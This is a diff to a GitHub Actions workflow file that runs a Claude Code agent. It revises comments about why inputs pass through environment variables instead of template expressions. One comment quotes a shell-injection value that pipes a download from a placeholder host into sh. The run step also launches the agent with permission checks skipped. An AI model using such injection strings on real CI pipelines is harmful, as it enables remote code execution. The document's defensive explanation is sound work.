@@ -88,11 +88,14 @@ runs:
         mkdir -p .claude/agents
         sed -e "s|\${CLAUDE_PLUGIN_ROOT}|${{ github.action_path }}|g" \
           "${{ github.action_path }}/agents/verdict.md" > .claude/agents/verdict.md
-        # Through env, never `${{ }}` inside the script: interpolation splices
-        # text into the shell before bash parses the line, so quoting does not
-        # help and an input like `"; curl evil | sh; #` executes. Inputs are
-        # workflow-author controlled, but one person wiring run-prompt to a PR
-        # title turns that into remote code execution.
+        # Through env, never an Actions expression inside the script body.
+        # Expression substitution splices text into the shell before bash
+        # parses the line, so quoting does not help and an input like
+        # `"; curl evil | sh; #` executes. Inputs are workflow-author
+        # controlled, but one person wiring run-prompt to a PR title turns
+        # that into remote code execution. (Writing the expression delimiters
+        # even inside a comment here is itself a parse error — the runner
+        # templates the whole block before bash ever sees it.)
         claude -p "Use the verdict agent. $RUN_PROMPT" \
           --setting-sources project --dangerously-skip-permissions
 
@@ -120,9 +123,9 @@ runs:
         MAX_AGE_HOURS: ${{ inputs.max-age-hours }}
         MIN_RUN_NUMBER: ${{ inputs.min-run-number }}
       run: |
-        # Every value below arrives through env rather than ${{ }} — see the
-        # note in the run step; quoting a shell interpolation does not help,
-        # because the substitution happens before bash parses the line.
+        # Every value below arrives through env rather than an Actions
+        # expression — see the note in the run step; quoting does not help,
+        # because substitution happens before bash parses the line.
         ARGS=("$PROJECT" --fail-on "$FAIL_ON" --findings "$FINDINGS")
         [ -n "$MAX_AGE_HOURS" ] && ARGS+=(--max-age-hours "$MAX_AGE_HOURS")
         [ -n "$MIN_RUN_NUMBER" ] && ARGS+=(--min-run-number "$MIN_RUN_NUMBER")
